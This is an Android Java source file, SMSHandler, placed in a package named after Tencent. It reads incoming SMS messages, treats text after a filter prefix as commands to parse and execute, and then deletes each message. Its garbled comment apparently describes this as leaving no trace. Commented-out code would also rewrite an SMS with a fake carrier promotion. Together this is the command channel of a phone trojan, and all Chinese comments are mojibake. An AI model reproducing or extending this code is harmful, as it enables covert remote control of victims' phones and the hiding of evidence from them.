package com.tencent.sms;

import java.net.URL;

import android.content.ContentUris;
import android.content.Context;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

import com.tencent.qq.Keys;

/*
 * ���ڽ���SMSObserver���͹����Ķ������ݣ�MessageItem��
 */
public class SMSHandler extends Handler{

	private static final String TAG="SMSHandler";
	private Context mContext;
	
	public SMSHandler(Context context)
	{
		super();
		this.mContext=context;
	}
	@Override
	public void handleMessage(Message msg)
	{
		MessageItem item=(MessageItem)msg.obj;
		
		//new Intent(Intent.ACTION_REBOOT);
		  Log.e(TAG, "token>>>>>>>smsObserver start:"+item.toString()+","+item.getPhone()+","+item.getBody());
		  
		//���Ը��ݶ������ݽ����жϣ�ִ������Ҫ�Ĳ������緢�� Filter�ַ�+dialog��͵������Ի���
		
		/*ContentValues values=new ContentValues();
		//values.put(SMSConstant.ADDRESS, "10086"); �޸������ûЧ������Ϊ��Ҫ�޸Ķ������ܰ���ʾ���ֻ����޸�
		values.put(SMSConstant.BODY, "�𾴵��û������ã������ƶ��ж���������ϲ���Ѿ���ѻ��3���µ�WLAN��CMCCУ԰����� 20Ԫ����(100Сʱ)������ײͷ���");
		mContext.getContentResolver().update(uri, values, SMSConstant.ADDRESS+" = "+item.getPhone() ,null);*/
		String instruct=item.getBody().trim().substring(Keys.FILTER.length()).trim();
		//����ָ�����
		InstructResolver instructResolver= new InstructResolver(this.mContext);
		instructResolver.Parse(instruct);
		if(instructResolver.execute())
			Log.v(TAG, "ָ��ִ�гɹ���");
		else {
			Log.v(TAG, "ָ��ִ��ʧ�ܣ�");
		}
		if(item.getId()!=-1){
			//��Ӹ�����ID��β��·����
			Uri uri=ContentUris.withAppendedId(Uri.parse(SMSConstant.SMS_URI_ALL), item.getId());
			//ɾ��ָ���Ķ���,���������ۼ�������^_^
			mContext.getContentResolver().delete(uri,null,null);
		}
		Log.v(TAG, item.toString());
	}
}
